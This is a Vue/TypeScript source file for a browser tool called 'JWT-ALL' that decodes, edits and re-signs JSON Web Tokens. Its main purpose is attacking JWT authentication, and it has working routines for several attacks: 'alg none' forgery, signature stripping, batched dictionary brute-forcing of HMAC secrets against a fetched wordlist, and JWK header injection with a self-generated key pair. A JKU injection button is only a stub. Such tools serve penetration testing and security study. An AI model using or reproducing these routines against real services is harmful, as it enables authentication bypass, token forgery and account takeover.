<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { jwtVerify, SignJWT, generateKeyPair, exportJWK } from 'jose'

const algs = ref(["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"])
const selected_alg = ref("HS256")
const sjwt = ref("")
const tjwt = ref("")
const header = ref("")
const payload = ref("")
const verify_signature = ref("")
const signature_type = ref("")
const jwt_secret_key = ref("")
const key_pair = ref({} as any)

const algs_map: { [key: string]: string } = {
    "HS256": `HMACSHA256(
    base64UrlEncode(header) + "." +
    base64UrlEncode(payload),  
    your-256-bit-secret
) OR secret base64 encoded`,
    "HS384": `HMACSHA384(
    base64UrlEncode(header) + "." +
    base64UrlEncode(payload),
    your-384-bit-secret
) OR secret base64 encoded`,
    "HS512": `HMACSHA512(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-512-bit-secret
) OR secret base64 encoded`,
    "RS256": `RSASHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "RS384": `RSASHA384(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "RS512": `RSASHA512(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "ES256": `ECDSASHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "ES384": `ECDSASHA384(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "ES512": `ECDSASHA512(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "PS256": `RSAPSSSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "PS384": `RSAPSSSHA384(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
    "PS512": `RSAPSSSHA512(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  PUBLIC KEY, 
  PRIVATE KEY
)`,
}

const select_alg = () => {

    let k: string = selected_alg.value
    signature_type.value = ""
    signature_type.value = algs_map[k]
    if (header.value) {
        let h = JSON.parse(header.value)
        if (h.alg) {
            h.alg = k
            header.value = JSON.stringify(h, null, 2)
        }
    }
    encodeJwt()

}

const decodeJwt = () => {

    let jwt = sjwt.value.trim().split(".")
    if (jwt.length > 3) {
        alert("Invalid JWT format!")
        return
    }

    if (jwt.length >= 1 && jwt[0]) {
        let hh = JSON.parse(atob(jwt[0]))

        if (hh.alg) {
            if (algs.value.includes(hh.alg)) {
                selected_alg.value = hh.alg
                select_alg()
            }
        }

        header.value = JSON.stringify(hh, null, 2)
    }

    if (jwt.length >= 2 && jwt[1]) {
        let p = JSON.stringify(JSON.parse(atob(jwt[1])), null, 2)
        payload.value = p
    }

    if (jwt.length >= 3 && jwt[2]) {
        verify_signature.value = jwt[2]
    }


    // let a = JSON.stringify(JSON.parse(h))
}

const base64UrlEncode = (str: string) => {
    // 将 Base64 编码转换为 Base64Url
    let base64 = btoa(str); // 先进行标准 Base64 编码
    base64 = base64.replace(/\+/g, '-').replace(/\//g, '_'); // 替换 Base64 特有的字符
    return base64.replace(/=+$/, ''); // 去掉填充字符
}

const encodeJwt = async () => {
    let t = ""
    try {
        let h = header.value
        if (h) {
            let header_b64 = base64UrlEncode(JSON.stringify(JSON.parse(h)))
            t += header_b64
        }

        let p = payload.value
        if (p) {
            let payload_b64 = base64UrlEncode(JSON.stringify(JSON.parse(p)))
            t += "." + payload_b64
        }

        let s = verify_signature.value
        if (h && p && s) {
            t += "." + s
        }

        if (h && p && selected_alg.value.includes("HS")) {
            if (jwt_secret_key.value) {
                const secret = new TextEncoder().encode(
                    jwt_secret_key.value,
                )

                const jwt = await new SignJWT(JSON.parse(payload.value))
                    .setProtectedHeader(JSON.parse(header.value))
                    .sign(secret)
                t = jwt
            }
        } else if (h && p) {
            if (key_pair.value.priv) {
                const jwt = await new SignJWT(JSON.parse(payload.value))
                    .setProtectedHeader(JSON.parse(header.value))
                    .setExpirationTime('2h')
                    .sign(key_pair.value.priv)
                const { payload: verifiedPayload } = await jwtVerify(jwt, key_pair.value.pub);
                console.log('Verified Payload:', verifiedPayload);
                t = jwt
            }
        }

        tjwt.value = t
    } catch (e) {
        alert(`${e}`)
    }
}

const clearJwt = () => {
    tjwt.value = ""
    header.value = ""
    payload.value = ""
    signature_type.value = ""
    jwt_secret_key.value = ""
}

const none_attack = () => {
    let h = JSON.parse(header.value)
    if (h.alg) {
        h.alg = "none"
        jwt_secret_key.value = ""
        header.value = JSON.stringify(h, null, 2)
        encodeJwt()
    }
}
const no_sign_attack = () => {
    verify_signature.value = ""
    jwt_secret_key.value = ""
    none_attack()
    tjwt.value += "."
}

const brute_force_attack = async () => {
    let t = sjwt.value;  // 获取目标 JWT
    const batchSize = 20;  // 每次并发处理的数量
    try {
        // 获取密钥列表并过滤空行或无效密钥
        let f = await fetch("jwt.secrets.list");
        let list = await f.text();
        let keys = list.split("\n").map(key => key.trim()).filter(key => key.length > 0);  // 过滤空行

        // 将密钥列表分批，每批包含最多 20 个密钥
        const batches = [];
        for (let i = 0; i < keys.length; i += batchSize) {
            batches.push(keys.slice(i, i + batchSize));
        }

        // 处理每个批次
        for (const batch of batches) {
            const promises = batch.map((k) => {
                return new Promise((resolve, reject) => {
                    try {
                        // 使用 jose 进行 JWT 验证
                        jwtVerify(t, new TextEncoder().encode(k))
                            .then(() => resolve(k))  // 如果验证成功，返回密钥
                            .catch(() => resolve(null));  // 如果验证失败，返回 null
                    } catch (e) {
                        resolve(null);  // 捕获任何异常并返回 null
                    }
                });
            });

            // 等待当前批次的验证完成
            const results = await Promise.all(promises);

            // 检查当前批次中是否找到有效的密钥
            const foundKey = results.find(result => result);
            if (foundKey) {
                alert(`Success! Secret Key: ${foundKey}`);  // 找到密钥后弹窗
                jwt_secret_key.value = foundKey as string;  // 将密钥保存到组件状态中
                return;  // 一旦找到密钥，结束整个暴力破解
            }
        }

        // 如果没有找到密钥
        alert("No valid secret key found.");

    } catch (err) {
        console.error("Error during brute force attack:", err);
        alert("An error occurred during the attack.");
    }
};

const generate_jwk = async () => {

    if (!selected_alg.value.includes("HS")) {

        const { publicKey, privateKey } = await generateKeyPair(selected_alg.value, {
            extractable: true
        });

        // Export the public and private keys to JWK format
        const publicJWK = await exportJWK(publicKey);
        const privateJWK = await exportJWK(privateKey);

        let pub = JSON.parse(JSON.stringify(publicJWK, null, 2))
        pub.kid = crypto.randomUUID()
        key_pair.value = {
            pub: pub,
            priv: JSON.parse(JSON.stringify(privateJWK, null, 2))
        }

    } else {
        alert("Only RSA, ES, and PSS algorithms support JWK generation.")
    }

}
const jwk_injection_attack = async () => {

    await generate_jwk()
    let h = JSON.parse(header.value)
    h.alg = selected_alg.value
    h.typ = "JWT"
    h.jwk = key_pair.value.pub
    h.kid = h.jwk.kid
    header.value = JSON.stringify(h, null, 2)
    encodeJwt()
}

const jku_injection_attack = async () => {
    await generate_jwk()
    console.log(btoa(JSON.stringify(key_pair.value.pub, null, 2)))
}

onMounted(async () => {
    sjwt.value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.CQ13a7rjONXqoy8ARzP8oyKBI2PMNl7z76FCvuKVxo0"
    jwt_secret_key.value = "secure"
    decodeJwt()
    encodeJwt()
})
</script>
<template>
    <div class="d-flex justify-center">
        <div class="d-flex flex-column w-75">

            <div class="d-flex justify-space-between mt-10">

                <v-btn @mousedown="(event: MouseEvent) => {

                    if (event.button === 0) {
                        decodeJwt()
                    } else if (event.button === 1) {
                        clearJwt()
                    }
                }" variant="text">
                    <h1>JWT-ALL</h1>
                </v-btn>

                <p>Click <b>JWT-ALL</b> to decode jwt! Middle to Clear!</p>


                <div class="w-33"></div>
                <v-text-field class="mr-4" v-model="jwt_secret_key" label="Secret Key" variant="outlined"
                    @blur="encodeJwt"></v-text-field>
                <v-select width="100px" label="Alg" v-model="selected_alg" :items=algs variant="outlined"
                    @vue:mounted="select_alg" @update:model-value="select_alg"></v-select>
            </div>

            <div>
                <v-textarea rows="5" label="S-JWT" variant="outlined" no-resize v-model="sjwt"></v-textarea>
                <div class="d-flex">
                    <v-textarea rows="10" class="mr-2" label="Header" variant="outlined" no-resize v-model="header"
                        @blur="encodeJwt"></v-textarea>
                    <v-textarea rows="10" class="mr-2" label="Payload" variant="outlined" no-resize v-model="payload"
                        @blur="encodeJwt"></v-textarea>
                    <v-textarea rows="10" label="Verify Signature" variant="outlined" no-resize v-model="signature_type"
                        readonly></v-textarea>
                </div>
            </div>


            <v-textarea rows="5" label="T-JWT" variant="outlined" no-resize v-model="tjwt"></v-textarea>
            <div class="d-flex">
                <v-btn @click="none_attack">None</v-btn>
                <v-btn class="ml-4" @click="no_sign_attack">No Sign</v-btn>
                <v-btn class="ml-4" @click="brute_force_attack">Brute</v-btn>
                <v-btn class="ml-4" @click="jwk_injection_attack">JWK IJ</v-btn>
                <v-btn class="ml-4" @click="jku_injection_attack">JKU IJ</v-btn>
                <v-btn class="ml-4">KID PATH</v-btn>
            </div>
            <p class="mt-4">Dictionary: <a
                    href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a></p>

        </div>


    </div>
</template>
